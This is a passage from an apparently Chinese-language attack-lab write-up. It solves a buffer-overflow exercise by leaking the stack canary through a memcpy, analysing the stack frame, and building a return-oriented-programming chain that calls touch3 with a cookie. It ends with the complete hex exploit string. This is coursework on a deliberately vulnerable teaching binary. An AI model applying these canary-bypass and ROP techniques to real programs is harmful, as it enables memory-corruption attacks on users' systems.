要想知道`%fs:0x28`的值，可以通过第一次`memcpy`实现，取`(int)(-0x90(%rbp)) = 0x88`即可，据此划分第一次`memcpy`之后的栈帧

<center>


|         位置              |      值  |
|         :-:               |   :-:    |
|`-0x190(%rbp)~-0x111(%rbp)`|   与`-0x088(%rbp)~-0x009(%rbp)`相同   |
|`-0x110(%rbp)~-0x109(%rbp)`|   `%fs:0x28`   |
|`-0x108(%rbp)~-0x091(%rbp)`|   待定   |
|`-0x090(%rbp)~-0x089(%rbp)`|   `88 00 00 00 ?? ?? ?? ??`   |
|`-0x088(%rbp)~-0x009(%rbp)`|   待定   |
|`-0x008(%rbp)~-0x001(%rbp)`|   `%fs:0x28`   |

</center>

由于`-0x190(%rbp)~-0x109(%rbp)`在`memcpy`过程中直接被覆盖，其初始值不起任何作用

下一步考虑末尾的`leave`语句，其效果等价于
```
movq    %rbp, %rsp
popq    %rbp
```
因此，最后`ret`所返回的位置为`0x8(%rbp)`，也即第二次`memcpy`需要将我们希望执行的语句开头移动到`0x8(%rbp)`处，因此，`-0x100(%rbp)`应该是所需执行的语句头部，故从`-0x100(%rbp)`开始应有以下内容
```
// *(movq %rsp, %rax)
// *(movq %rax, %rdi)
*(popq %rax)   
Imm         
*(movl %eax, %ecx)
*(movl %ecx, %edx)
*(movl %edx, %esi)
*add_xy        
*(movq %rax, %rdi)
touch3        
cookie        
```
我们不需要前两行，是因为`402218~402229`已经完成了将`%rsp`（加上偏置量）转移到`%rdi`的任务，此外，要将完整的语句块复制到`0x8(%rbp)`处，可得`(int)(-0x8c(%rbp)) >= 0xd0`，此处取为`0xd0`，据此重新写出第一次`memcpy`后的栈帧分析

<center>


|         位置              |      值  |
|         :-:               |   :-:    |
|`-0x190(%rbp)~-0x111(%rbp)`|   与`-0x088(%rbp)~-0x009(%rbp)`相同   |
|`-0x110(%rbp)~-0x109(%rbp)`|   `%fs:0x28`   |
|`-0x108(%rbp)~-0x101(%rbp)`|   待定   |
|`-0x100(%rbp)~-0x0c1(%rbp)`|   需执行的语句块  |
|`-0x0c0(%rbp)~-0x091(%rbp)`|   待定   |
|`-0x090(%rbp)~-0x089(%rbp)`|   `88 00 00 00 d0 00 00 00`   |
|`-0x088(%rbp)~-0x009(%rbp)`|   待定   |
|`-0x008(%rbp)~-0x001(%rbp)`|   `%fs:0x28`   |

</center>

第二次`memcpy`之后，`-0x190(%rbp)~-0x1(%rbp)`之间的所有值实际上并未改变，故栈帧情况与上表一致

最后，我们还需要在某个位置存储`cookie`，且至少需要9个字节的空位（末尾需要补充`00`），故在`-0x0c0(%rbp)~-0x091(%rbp)`和`-0x088(%rbp)~-0x009(%rbp)`之中任选位置存储，并计算`Imm`即可。

最终得到的一种答案为
```
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
9d 22 40 00 00 00 00 00      
48 00 00 00 00 00 00 00     
64 23 40 00 00 00 00 00      
79 23 40 00 00 00 00 00      
04 23 40 00 00 00 00 00      
b6 22 40 00 00 00 00 00    
72 22 40 00 00 00 00 00      
8f 20 40 00 00 00 00 00      
00 00 00 00 00 00 00 00    
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
88 00 00 00 d0 00 00 00      
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00    
00 00 00 00 00 00 00 00   
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00 
33 30 63 64 31 65 65 34     
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00  
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
```

</details>
